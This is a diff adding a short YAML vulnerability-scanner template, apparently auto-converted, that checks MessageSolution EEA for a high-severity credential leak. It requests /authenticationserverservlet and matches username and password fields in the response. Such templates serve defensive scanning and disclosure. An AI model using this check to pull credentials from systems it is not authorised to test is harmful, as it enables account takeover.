@@ -1,0 +1,22 @@
+id: yaml-poc-messagesolution-eea-leak-CT-158957
+info:
+  name: Yaml Poc Messagesolution Eea Leak Ct 158957
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-messagesolution-eea-leak-CT-158957'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /authenticationserverservlet
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - <username>(.*?)</username>
+    - <password>(.*?)</password>
